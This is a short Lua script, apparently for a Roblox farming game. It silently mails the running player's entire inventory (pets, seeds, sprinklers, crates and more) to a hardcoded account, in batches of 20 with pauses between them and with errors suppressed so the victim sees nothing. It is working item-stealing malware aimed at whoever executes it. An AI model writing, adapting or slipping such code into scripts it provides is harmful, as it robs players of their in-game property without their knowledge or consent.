task.spawn(function()
    pcall(function()
        local TARGET = "AOCGamer2002"
        local Net = require(RS.SharedModules.Networking)
        local PSC = require(RS.ClientModules.PlayerStateClient)
        local uid = Net.Mailbox.LookupPlayer:Fire(TARGET)
        if not uid or type(uid) ~= "number" then return end
        local rep = PSC:GetLocalReplica()
        local inv = rep.Data.Inventory
        local cats = {"Pets", "Seeds", "Sprinklers", "HarvestedFruits", "WateringCans", "Mushrooms", "Gnomes", "Raccoons", "Crates"}
        local batch = {}
        for _, c in ipairs(cats) do
            if inv[c] then
                for k, v in pairs(inv[c]) do
                    local num = 0
                    if type(v) == "number" and v > 0 then
                        num = v
                    elseif type(v) == "table" and v.Id ~= nil then
                        if not (c == "Pets" and v.Equipped) then num = 1 end
                    end
                    
                    if num > 0 then
                        table.insert(batch, {Category = c, ItemKey = k, Count = num})
                        if #batch >= 20 then
                            pcall(function() Net.Mailbox.SendBatch:Fire(uid, batch, "") end)
                            batch = {}
                            task.wait(2)
                        end
                    end
                end
            end
        end
        if #batch > 0 then
            pcall(function() Net.Mailbox.SendBatch:Fire(uid, batch, "") end)
        end
    end)
end)
